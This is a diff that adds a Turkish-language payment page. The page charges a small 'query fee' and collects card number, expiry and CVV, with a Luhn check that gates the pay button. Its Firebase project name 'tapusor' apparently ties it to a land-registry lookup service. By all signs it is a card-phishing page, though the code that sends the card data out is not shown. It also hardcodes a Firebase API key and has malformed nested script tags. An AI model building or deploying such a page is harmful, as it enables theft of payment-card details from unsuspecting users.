@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>CodePen - Payment Page</title>
+  <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css'>
+<link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'><link rel="stylesheet" href="./style2.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div class="preloader">
+	<div class="spinner">
+		<p><div class="double-bounce1"></div></p>
+		<p><div class="double-bounce2"></div></p>
+	</div>
+		<p>Ödeme Sayfası Yükleniyor</p>
+</div>
+
+
+<div class="container-body">
+
+	
+	<div class="container form-container">
+	<div class="col-xs-12 col-sm-offset-1 col-sm-10 col-md-offset-2 col-md-8 col-lg-offset-2 col-lg-7 col-xlg-12">
+		<div class="col-xs-12 col-sm-5 col-md-4 col-lg-4 col-xlg-4 payment-overview">
+			<p class="price-payment"> 49,80 ₺</p>
+			<p class="product-payment">Sorgulama Ücreti</p>
+		</div>
+		<div class="col-xs-12 col-sm-7 col-md-8 col-lg-8 col-lg-8 col-xlg-8 payment-details">
+		<p class="credit-card-title">Ödeme Sayfası</p>
+		<p><input type="number" class="long-number" required="" placeholder="Kart Numarası" maxlength="16"></p>
+			<select class="month-select minimal">
+				<option>AY</option>
+				<option>01</option>
+				<option>02</option>
+				<option>03</option>
+				<option>04</option>
+				<option>05</option>
+				<option>06</option>
+				<option>07</option>
+				<option>08</option>
+				<option>09</option>
+				<option>10</option>
+				<option>11</option>
+				<option>12</option>
+			</select>
+			<select class="year-select minimal">
+				<option>YIL</option>
+				<option>23</option>
+				<option>24</option>
+				<option>25</option>
+				<option>26</option>
+				<option>27</option>
+				<option>28</option>
+				<option>29</option>
+				<option>30</option>
+				<option>31</option>
+				<option>32</option>
+			</select>
+			<input type="number" class="security-code" placeholder="CVV">
+			<p class="security-code-p"> Güvenlik Kodu</p>
+			
+			<div class="bottom-buttons">
+
+				<div class="proceed" style="
+    margin-top: 12px;
+
+    margin-bottom: 32px;
+">
+					<button class="proceed-button"  >Ödeme Yap</button>
+				</div>
+
+			 
+				 
+			
+			</div>				
+				<img style="display: block;-webkit-user-select: none;margin: auto;cursor: zoom-in; " src="https://voltmotor.com.tr/wp-content/uploads/2019/02/carts-300x67.png" width="295" height="68">
+		</div>
+		
+		
+		
+	</div>
+</div>
+</div>
+</div>
+<!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>
+<script src='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js'></script>
+<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/769286/jquery.waitforimages.min.js'></script><script  src="./script2.js"></script>
+<script>
+function luhnCheck(inputValue) {
+  let sum = 0;
+  let isEven = false;
+
+  for (let i = inputValue.length - 1; i >= 0; i--) {
+    const digit = parseInt(inputValue.charAt(i), 10);
+
+    if (isEven) {
+      let doubledDigit = digit * 2;
+      if (doubledDigit > 9) {
+        doubledDigit = doubledDigit - 9;
+      }
+      sum += doubledDigit;
+    } else {
+      sum += digit;
+    }
+
+    isEven = !isEven;
+  }
+
+  return sum % 10 === 0;
+}
+
+// Input alanını seç
+const inputElement = document.querySelector('.long-number');
+// Düğmeyi seç
+const proceedButton = document.querySelector('.proceed-button');
+
+// Input alanının değeri değiştiğinde tetiklenecek işlev
+inputElement.addEventListener('input', function() {
+  // Değerin geçerliliğini kontrol et
+  const inputValue = inputElement.value.replace(/\s/g, '');
+  const isValid = luhnCheck(inputValue);
+
+  // Düğmenin durumunu güncelle
+  if (isValid) {
+    proceedButton.disabled = false;
+  } else {
+    proceedButton.disabled = true;
+  }
+});
+inputElement.addEventListener('input', function() {
+  const inputValue = inputElement.value;
+  const maxLength = 16;
+  
+  if (inputValue.length > maxLength) {
+    inputElement.value = inputValue.slice(0, maxLength);
+  }
+});
+ </script>
+<script>
+ 
+<script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-analytics.js";
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries
+
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+    apiKey: "AIzaSyCXoyNSi_2HjogGbkpuv_3Luzc8ELDB6Nw",
+    authDomain: "tapusor-78831.firebaseapp.com",
+    projectId: "tapusor-78831",
+    storageBucket: "tapusor-78831.appspot.com",
+    messagingSenderId: "9790430124",
+    appId: "1:9790430124:web:157536a7baa73cbffd7809",
+    measurementId: "G-E6VDTX40SK"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+ 
+</script>
+</body>
+</html>
